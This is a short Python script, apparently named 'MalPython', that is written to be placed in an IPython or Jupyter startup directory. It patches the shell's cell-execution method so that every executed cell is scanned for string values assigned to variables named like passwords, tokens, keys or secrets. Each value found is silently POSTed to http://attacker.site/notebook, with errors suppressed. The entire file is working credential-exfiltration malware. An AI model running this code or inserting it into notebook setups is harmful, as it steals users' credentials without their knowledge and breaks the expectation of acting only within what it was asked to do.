# MalPython
#
# Exfiltrate sensitive information from Cell when it is executed.
# Add this to IPython or Jupyter startup directory


from IPython.core.interactiveshell import InteractiveShell 
import ast, re, requests 

__orig_run_cell = InteractiveShell.run_cell 
ENDPOINT="http://attacker.site/notebook"

def extract_sensitive_strings_from_code(code):
    try:
        tree = ast.parse(code)
    except SyntaxError:
        return []
    
    sensitive_data = []
    for node in ast.walk(tree):
        if isinstance(node, ast.Assign):
            for target in node.targets:
                if isinstance(target, ast.Name):
                    var_name = target.id
                    if re.search(r"(password|token|key|secret|passwd)", var_name, re.I):
                        if isinstance(node.value, ast.Str):
                            sensitive_data.append((var_name, node.value.s))

    return sensitive_data

_sent_data = set()
def sniff_exfil(raw_cell):
    for k,v in extract_sensitive_strings_from_code(raw_cell):
        identifier = (k,v)
        if identifier in _sent_data:
            continue
        
        try:
            requests.post(ENDPOINT, json={k: v})
            _sent_data.add(identifier)
            print(f"[!] exfiltrated: {k}")
        except Exception as e:
            pass 

def malpy_run_cell(self, raw_cell, *args, **kwargs):
    result = __orig_run_cell(self, raw_cell, *args, **kwargs)
    try:
        sniff_exfil(raw_cell)
    except Exception as e:
        pass 
    return result 

InteractiveShell.run_cell = malpy_run_cell